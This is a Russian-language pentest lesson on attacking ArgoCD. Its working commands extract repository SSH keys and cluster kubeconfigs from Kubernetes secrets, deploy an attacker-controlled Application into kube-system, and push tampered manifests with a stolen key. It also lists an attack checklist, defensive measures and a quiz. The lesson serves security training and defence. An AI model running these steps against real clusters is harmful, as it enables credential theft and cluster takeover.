---
id: cloud-argocd
title: "ArgoCD: GitOps, repo-креды и доступ к кластеру"
category: cloud
parent: cloud-cicd-deep
difficulty: hard
order: 2
tags: [cloud, argocd, gitops, kubernetes, repo, cluster, rbac]
prerequisites: [cloud-cicd-deep, cloud-kubernetes-rbac]
useful_for:
  - "Атаки на ArgoCD"
  - "Захват доступа к кластеру через GitOps"
  - "Пентест GitOps-развёртываний"
estimated_minutes: 50
summary: "ArgoCD: applications, repo credentials, cluster credentials и RBAC. Как GitOps-контроллер держит доступ к репозиториям и кластерам и как этим злоупотребить."
---

## Зачем этот урок

ArgoCD — самый популярный GitOps-контроллер для Kubernetes. Он следит за репозиториями и синхронизирует манифесты в кластеры. Для этого он хранит **repo credentials** (доступ к Git) и **cluster credentials** (доступ к кластерам). Компрометация ArgoCD даёт «мастер-ключ»: можно деплоить произвольные манифесты в целевые кластеры и читать приватные репозитории. Часто ArgoCD доступен извне (веб-интерфейс) и имеет слабую аутентификацию по умолчанию.

## Модель ArgoCD

- **Application** — связка repo + path + target cluster/namespace.
- **Project** — границы (какие repos/clusters доступны).
- **Repository** — Git-репозиторий с манифестами; хранит креды (SSH/HTTPS).
- **Cluster** — целевой кластер; хранит kubeconfig/токен.
- **RBAC** — роли ArgoCD (`role:admin`, `role:readonly`, кастомные).
- **SSO** — Dex/OIDC; часто настроен, но иногда с дефолтным admin.
- **Sync** — применение манифестов; можно включить auto-sync и pruning.

Ключевые секреты ArgoCD хранятся в Kubernetes Secret (`argocd-secret`, repo/cluster secrets). Если у вас есть доступ к namespace argocd — вы получаете всё.

## Инструменты и команды

```bash
# CLI
argocd login argocd.example.com --username admin --password <pw>
argocd app list
argocd repo list          # репозитории и их URL
argocd cluster list       # целевые кластеры
argocd proj list

# Через API/секреты
kubectl get secrets -n argocd
kubectl get secret argocd-secret -n argocd -o jsonpath='{.data.admin\.password}' | base64 -d  # bcrypt

# repo-секреты содержат SSH-ключи/токены
kubectl get secret -n argocd -l argocd.argoproj.io/secret-type=repository -o yaml

# cluster-секреты содержат kubeconfig
kubectl get secret -n argocd -l argocd.argoproj.io/secret-type=cluster -o yaml
```

## Разобранный пример: деплой произвольного манифеста

Сценарий: у нас есть доступ к ArgoCD (admin-пароль или право создавать Applications).

```bash
# 1. Смотрим доступные кластеры
argocd cluster list
# SERVER                          NAME        VERSION
# https://kubernetes.default.svc  in-cluster  1.29
# https://prod-cluster.example    prod        1.29

# 2. Смотрим репозитории
argocd repo list
# TYPE  NAME  REPO                                     INSECURE
# git   app   git@github.com:acme/manifests.git        false

# 3. Создаём Application, деплоящую привилегированный под в целевой кластер
argocd app create evil \
  --repo https://github.com/attacker/manifests.git \
  --path . --dest-server https://prod-cluster.example \
  --dest-namespace kube-system --sync-policy automated
argocd app sync evil
```

Если ArgoCD имеет права на целевой кластер (обычно cluster-admin), ваш манифест создаст под в `kube-system` с привилегиями — фактически RCE на кластере. Даже без auto-sync можно синхронизировать вручную. Если репозиторий ArgoCD доступен на запись (через украденный SSH-ключ), можно подменить манифесты в существующем repo — эффект тот же, но тише.

## Секреты ArgoCD

- **argocd-secret** — содержит `server.secretkey`, пароль admin (bcrypt), TLS.
- **repo secrets** — SSH-ключи/токены к Git.
- **cluster secrets** — kubeconfig/токены к кластерам.
- **Наличие доступа к namespace argocd** = полный контроль.

Если у вас есть только веб-доступ, ищите слабый admin-пароль (`argocd`/`admin`), уязвимости версии, или SSO-мисконфиг (например, доверие к OIDC без проверки групп).

## Чек-лист атаки

1. Найти ArgoCD (веб/CLI) и проверить дефолтные креды.
2. Проверить версию на известные CVE.
3. Перечислить apps, repos, clusters, projects.
4. Проверить права: можно ли создавать Applications/синхронизировать.
5. Проверить namespace argocd на секреты (если есть k8s-доступ).
6. Проверить SSO/Dex конфигурацию.
7. Проверить, включён ли auto-sync и pruning.

## Обход защит и edge cases

- **RBAC ArgoCD.** Ограничивает действия; но `role:admin` часто широк. Проверяйте свою роль.
- **Project restrictions.** Project может ограничивать repos/clusters; проверяйте, есть ли project `default` с широкими правами.
- **SSO без group-check.** Если OIDC-логин не проверяет группы, любой пользователь IdP может получить admin.
- **Webhook.** `argocd-server` может иметь webhook-эндпоинты; иногда они дают синхронизацию без auth.
- **Version CVEs.** Были уязвимости обхода auth (например, в старых версиях). Проверяйте версию.
- **Network policy.** ArgoCD может быть доступен только внутри; тогда нужен пивот.

## Частые ошибки и подводные камни

- Считать ArgoCD «просто дашбордом» и не проверять права на деплой.
- Игнорировать namespace argocd как источник секретов.
- Не проверить дефолтный admin.
- Забыть про SSO-мисконфиг.
- Не проверить версию на CVE.

## Защита и детект

- Сменить дефолтный admin-пароль; включить SSO с проверкой групп.
- Ограничить RBAC ArgoCD; не давать `role:admin` массово.
- Ограничить Projects (repos/clusters); запретить деплой в kube-system.
- Защитить namespace argocd (RBAC, secrets encryption).
- Аудит: ArgoCD logs, k8s audit на создание подов из ArgoCD.

## Модель угроз и типовые мисконфиги

Типичный мисконфиг — дефолтный admin. Второй — SSO без group-check. Третий — широкий project. Четвёртый — доступ к namespace argocd. Пятый — auto-sync в kube-system. Все ведут к RCE на кластере.

## Практическое задание

1. Разверните ArgoCD и войдите с admin.
2. Создайте Application, деплоящую под в тестовый кластер.
3. Ограничьте project и проверьте, что деплой в kube-system блокируется.
4. Включите SSO и проверьте group-check.

## Что дальше / решение

Из ArgoCD получаем деплой в кластеры и доступ к репозиториям. Дальше — RCE через привилегированный под, чтение секретов. Зафиксируйте путь «ArgoCD → деплой → кластер» в графе. Если RBAC ограничен — ищите repo/cluster secrets или SSO-мисконфиг.

## Разобранный пример 2: repo-креды и подмена манифестов

Если у вас есть доступ к repo-секретам ArgoCD, вы получаете SSH-ключ или токен к Git-репозиторию с манифестами. Тогда можно подменить манифесты в существующем repo — и ArgoCD развернёт ваш код при следующей синхронизации (тише, чем создание нового Application).

```bash
# Извлекаем repo-секрет
kubectl get secret -n argocd -l argocd.argoproj.io/secret-type=repository -o json \
  | jq -r '.items[].data | to_entries[] | "\(.key)=\(.value|@base64d)"'
# type=git
# url=git@github.com:acme/manifests.git
# sshPrivateKey=-----BEGIN OPENSSH PRIVATE KEY-----...

# Клонируем репозиторий с ключом
git clone git@github.com:acme/manifests.git
cd manifests
# правим deployment, добавляем привилегированный под/образ
git commit -am "sync" && git push
# ArgoCD (auto-sync) применит изменения
```

Если ArgoCD настроен на auto-sync с pruning, ваши манифесты применятся автоматически. Даже без auto-sync можно нажать Sync. Это самый «тихий» путь: изменения выглядят как обычный коммит в Git, а не как действие в кластере. Проверяйте, есть ли у вас доступ к repo-секретам или напрямую к репозиторию.

## RBAC ArgoCD и проекты

ArgoCD RBAC определяет, что вы можете делать. Часто роли настроены слишком широко.

```bash
# Смотрим свою роль и политики
argocd account get-user-info
kubectl get cm -n argocd argocd-rbac-cm -o jsonpath='{.data.policy\.csv}'
# p, role:developer, applications, *, */*, allow
# p, role:developer, clusters, get, *, allow

# Проверяем, какие clusters доступны
argocd cluster list
argocd proj get default
# Destinations: *, Namespaces: *
```

Project `default` с `Destinations: *` и `Namespaces: *` позволяет деплоить в любой кластер и namespace, включая `kube-system`. Если ваша роль может создавать Applications в этом проекте — вы контролируете кластер. Проверяйте `argocd-rbac-cm`, роли SSO-групп и границы проектов. Часто `role:admin` выдаётся инженерам, а project restrictions отсутствуют.

## Квиз

```quiz
- question: "Что хранит ArgoCD для доступа к кластерам?"
  options:
    - "cluster secrets с kubeconfig/токенами"
    - "Только URL"
    - "Только логи"
    - "DNS-записи"
  answer: 0
  explanation: "Cluster secrets содержат креды к целевым кластерам."
- question: "Почему компрометация ArgoCD = мастер-ключ?"
  options:
    - "Можно деплоить произвольные манифесты в кластеры"
    - "Он только показывает статус"
    - "Он не имеет прав"
    - "Он шифрует"
  answer: 0
  explanation: "ArgoCD синхронизирует манифесты от имени cluster-admin."
- question: "Где лежат секреты ArgoCD?"
  options:
    - "В Kubernetes Secret в namespace argocd"
    - "В KMS"
    - "В Route 53"
    - "В NSG"
  answer: 0
  explanation: "argocd-secret, repo/cluster secrets — всё в namespace argocd."
- question: "Какой SSO-мисконфиг опасен?"
  options:
    - "OIDC без проверки групп (любой пользователь IdP получает доступ)"
    - "SSO с MFA"
    - "SAML с подписью"
    - "LDAP"
  answer: 0
  explanation: "Без group-check любой аутентифицированный пользователь может стать admin."
```

## Где пригодится

- **Red team:** захват кластера через GitOps.
- **Пентест k8s:** оценка ArgoCD.
- **Blue team:** настройка RBAC и SSO.
- **Supply chain:** подмена манифестов.
